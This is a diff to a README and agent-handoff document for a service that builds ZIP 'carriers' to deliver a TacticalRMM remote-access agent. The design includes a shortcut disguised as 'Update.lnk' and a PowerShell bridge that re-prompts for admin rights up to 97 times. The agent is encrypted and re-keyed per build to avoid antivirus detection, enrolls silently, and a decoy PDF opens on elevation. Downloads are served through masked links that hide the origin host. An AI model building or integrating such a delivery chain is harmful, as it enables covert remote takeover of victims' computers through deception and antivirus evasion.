@@ -2,9 +2,99 @@
 
 ## What this repo is for
 
-Vantra is a customer-facing portal built on top of a self-hosted TacticalRMM instance. When a customer adds a device, Vantra generates a Windows installer (an `.exe`, produced by TacticalRMM's own build service) plus an install command the customer runs. Today customers download that `.exe` directly, but antivirus software sometimes flags it as suspicious — a common problem with generic/community-signed RMM agent installers.
+Vantra is a customer-facing portal built on top of a self-hosted TacticalRMM instance. This repo
+is the **installer/generator service** that converts a per-device enrollment into a single
+**offline ZIP carrier** (agent already encrypted inside — nothing is fetched on the target PC),
+and optionally attaches a **guide PDF** that auto-opens in the default browser right after the
+user approves the launcher. It is a Fastify service ("generator"), deployed separately from the
+Vantra web app (`vantra` repo), and called by it over HTTP.
 
-This repo is for converting that installer + install command into a single, properly packaged **MSI** that installs unattended (no manual command line for the customer) and addresses the antivirus/signing issue, plus a **ZIP bundle** option that ships a single obfuscated `Agent.lnk` which downloads and silently enrolls the agent. This is security- and packaging-focused work — not related to the Vantra web app's own codebase, which lives in a separate repo.
+---
+
+## ⚡ Integrate this into the Vantra web app (`vantra` main repo) — agent handoff
+
+This section is the integration contract. The generator API is stable; the web app needs exactly
+three changes (all already implemented in the local `vantra` checkout — see "Web app changes"
+below for what to port).
+
+### 1. The carrier the generator produces
+
+```
+Agent.zip
+ ├─ Update.lnk            ← double-click entry: PowerShell → Start-Process .\launcher\Launcher.exe -Verb RunAs
+ └─ launcher/             ← innerFolder (renameable per build)
+     ├─ Launcher.exe      ← native MinGW GUI PE (no console, no Mono/.NET needed)
+     ├─ agent.bin         ← the real agent, AES-256-CTR-encrypted, per-build re-keyed (payloadName renameable)
+     └─ <guide>.pdf       ← OPTIONAL attached PDF; opens automatically after the user approves UAC
+```
+
+At runtime on the target PC: unzip → double-click `Update.lnk` → PowerShell bridge runs
+`Start-Process .\launcher\Launcher.exe -Verb RunAs` (retrying UAC every 1 s up to 97× if
+dismissed) → the moment the user clicks **Yes**, `Launcher.exe` decrypts the config, installs +
+silently enrolls the agent (`--silent`), and **immediately** opens the attached PDF in the default
+browser (`ShellExecuteW "open"`, elevated-token fallback via `explorer.exe`). The PDF must sit in
+the zip's launcher subfolder — `Update.lnk` stays alone at the root.
+
+### 2. Generator API contract — `POST /build` (JSON, bearer `GENERATOR_SECRET`)
+
+| Field | Type | Notes |
+|---|---|---|
+| `exeUrl` | string (https) | required — agent deploy URL (unused by launcher mode at runtime) |
+| `apiUrl` | string (https) | required — TRMM base API URL |
+| `clientId`, `siteId` | int > 0 | required — per-org/client + fresh per-device site |
+| `agentType` | `"workstation" \| "server"` | required |
+| `authToken` | string | required — the **64-hex deployment `token_key`**, never the uid |
+| `features` | string[] | `["rdp","ping","power"]` |
+| `expiryHours` | int 1–168 | download-window (web uses 72) |
+| `launcherMode` | bool | **`true`** → offline carrier ZIP (the current flow) |
+| `flags` | object | `{ amsi: "none", fileName?, outDir?, zipName?, innerFolder?, launcherName?, payloadName?, updateLinkName? }` |
+| `pdf` | string (base64 data URL) | **optional** attached guide PDF (≤ 20 MB, `%PDF` magic) |
+| `pdfName` | string | optional bare `*.pdf` entry name (default `guide.pdf`, ≤ 64 chars, no path) |
+| `pdfDelaySec` | int 0–120 | optional open delay in seconds (default **0 = open immediately**) |
+
+**Dev-only:** `pdfPath` (absolute server-local path) is accepted instead of `pdf` when the
+generator env has `ALLOW_LOCAL_PDF=1` — never enable in production.
+
+**Response:** `{ jobId, downloadUrl, expiresAt }` where `downloadUrl = <REDIRECT_BASE_URL>/d/<jobId>`
+(a masked link that 302s to the zip). Specify an optional `flags.zipName` to customise the served
+filename.
+
+### 3. Web app changes to port (already done in the local `vantra` checkout, branch `main`)
+
+1. **`lib/zip-generator.ts`** — add `pdfBase64?: string` and `pdfName?: string` to
+   `CallZipGeneratorOpts`; when set, forward them in the JSON body as `pdf` / `pdfName`.
+2. **`app/api/devices/deployments/route.ts`** — in the `installMethod === "zip"` branch, read
+   `pdf` / `pdfName` from the JSON body and validate: bytes start with `%PDF`, ≤ 20 MB, bare
+   `*.pdf` name (no path separators / `..` / > 64 chars). Pass to `callZipGenerator`.
+3. **`components/add-device-modal.tsx`** — under the "ZIP bundle (one agent)" method card, an
+   **optional** file input (`accept=".pdf"`, ≤ 20 MB, client-side validation). On submit,
+   base64-encode the file into a `data:application/pdf;base64,…` URL and include `pdf` +
+   `pdfName` in the JSON payload.
+
+> Mirror the same validation as the existing "Signed MSI" PDF upload — the rules are identical.
+> Without a PDF the zip simply carries none (all fields optional; back-compatible with the
+> currently-live flow).
+
+### 4. Verify an integration
+
+- `npx tsc --noEmit` clean in both repos.
+- Local generator build with a PDF → zip must contain `launcher/<pdfName>`; server validation
+  card prints `PASS| encrypted config carries attached PDF` and
+  `PASS| encrypted config carries PDF open delay`.
+- On a Windows VM: extract → `Update.lnk` → UAC **Yes** → PDF opens immediately (before install
+  finishes) → `C:\Windows\Temp\lnk_chain_debug.txt` contains `LNKCHAIN-PDF-OPEN ok=1`.
+- Device appears **Online** in TRMM (enrollment uses the same 64-hex `token_key` flow).
+
+### 5. Repo map
+
+| Work | Repo | Branch | Notes |
+|---|---|---|---|
+| Generator / carrier (this repo) | `softdeployautomation-sketch/vantra-installer` | `installer-dev` (main = user-confirmed fixes only) | FIX 1–5 + retry loop + renameable entries |
+| Silent agent fork | `MichealKrugman/rmmagent` (fork of `amidaware/rmmagent`) | `develop` | `b675488` |
+| Server-side `--silent` | `MichealKrugman/tacticalrmm` | `develop` | `dc636a6` |
+| Web app (where the 3 changes go) | `softdeployautomation-sketch/vantra` | `main` | launcher-mode caller live |
+
+---
 
 ## What was actually built & shipped (2026-09-20) — the current end state
 
@@ -16,7 +106,8 @@ Agent.zip
  ├─ Update.lnk            ← double-click entry: PowerShell → Start-Process .\launcher\Launcher.exe -Verb RunAs
  └─ launcher/
      ├─ Launcher.exe      ← native MinGW GUI PE (~51 KB, low-entropy; AV-heuristic-safe)
-     └─ agent.bin         ← the real agent, AES-256-CTR-encrypted, per-build re-keyed
+     ├─ agent.bin         ← the real agent, AES-256-CTR-encrypted, per-build re-keyed
+     └─ <guide>.pdf       ← OPTIONAL attached PDF (auto-opens in the browser right after install)
 ```
 
 The generator **never fetches the agent at build time** (offline contract). The agent exe is
@@ -56,6 +147,17 @@ overlay; the launcher decrypts it, tokenizes it (quote-aware), and passes it ver
    `tacticalrmm/api/tacticalrmm/agents/views.py` + `core/installer.ps1` now append `--silent`.
 8. **Delivery** — the web app mints a masked link (`dl.instaweb.top/d/<jobId>`, nginx) that
    streams the zip for a 72h window; the origin host is hidden behind the redirector.
+9. **Attached guide PDF (auto-open after install)** — `POST /build` accepts an optional
+   `pdf` (base64 data URL — the web "user area" transport) or `pdfPath` (dev-only, gated on
+   `ALLOW_LOCAL_PDF=1`) plus `pdfName`/`pdfDelaySec` (default 0). The PDF is baked into the
+   zip in the SAME launcher subfolder (`launcher/<pdfName>`); the encrypted config carries
+   `pdf=` + `pdfDelay=`. The native launcher (`launcher.c open_pdf`) resolves
+   `<its own folder>/<pdf>` and opens it in the default browser/handler **IMMEDIATELY at
+   launcher startup** — i.e. right after the user's UAC "Yes" to `Launcher.exe`, before any
+   install work (never before the Yes: the process only exists once elevated). Opening:
+   `ShellExecuteW "open"` first, with an elevated-token fallback through `explorer.exe`
+   (Chromium/Edge refuse a direct high-IL launch). Debug markers: `LNKCHAIN-PDF-OPEN` /
+   `LNKCHAIN-PDF-MISSING`.
 
 ### Verified 2026-09-20 (local generator + KVM Win11 VM)
 - `npx tsc --noEmit` clean; launcher payload round-trip byte-identical; encrypted config
@@ -63,6 +165,15 @@ overlay; the launcher decrypts it, tokenizes it (quote-aware), and passes it ver
 - Live web mint (`silent-qa-…`) **user-confirmed "works as expected"** on the VM; local
   silent-agent zip also staged to the VM and verified byte-for-byte.
 - Retry loop now reproduced exactly (1057-byte `Update.lnk` bridge identical to live).
+- **PDF attach** (2026-09-20): local build `cbaf8b28` shipped
+  `{Update.lnk, launcher/Launcher.exe, launcher/agent.bin, launcher/welcome.pdf}` —
+  `welcome.pdf` byte-identical to the source; validation card ALL-PASS incl. *"encrypted
+  config carries attached PDF (ciphertext-only)"* + *"PDF open delay (2s)"*; shipped
+  `Launcher.exe` contains `LNKCHAIN-PDF-*` markers. Staged on the VM as
+  `C:\Users\thegreenerland\Downloads\pdf-android-guide.zip` (sha `b6193957…`).
+  **Timing fix (rebuild `65e8c78e`, sha `891517d6…`):** PDF now opens IMMEDIATELY at
+  launcher startup (right after the user's UAC "Yes"), not after enrollment — `pdfDelay`
+  default 0; same zip now staged on the VM (sha `891517d6…`, validation "PDF open delay (0s)").
 
 ### Repo map (this project's code)
 | Work | Repo | Branch | Commit |
@@ -76,7 +187,7 @@ overlay; the launcher decrypts it, tokenizes it (quote-aware), and passes it ver
 cherry-picked there (per the no-full-branch-merge rule — a full `installer-dev → main` merge
 carries unrelated history).
 
-## ZIP bundle (one agent) — `SoftDeployAutomation-sketch/vanta-installer`
+## ZIP bundle (one agent) — `softdeployautomation-sketch/vantra-installer`
 
 The ZIP installer flow (STAGE 1 + STAGE 2):
 
